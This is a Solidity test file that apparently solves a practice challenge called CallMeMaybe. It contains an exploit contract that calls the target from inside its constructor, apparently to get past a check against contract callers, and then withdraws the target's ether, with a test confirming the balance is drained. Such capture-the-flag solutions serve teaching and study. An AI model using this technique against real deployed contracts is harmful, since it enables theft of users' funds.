// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/05_CallMeMaybe/CallMeMaybe.sol";

contract Exploit {
    CallMeMaybe public instance;

    constructor(address payable _instanceAddr) payable {
        instance = CallMeMaybe(_instanceAddr);
        instance.hereIsMyNumber();
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

// forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;

    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        vm.startPrank(user1);

        Exploit exploit = new Exploit(payable(address(instance)));

        exploit.withdraw();

        vm.stopPrank();

        checkSuccess();
    }


    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
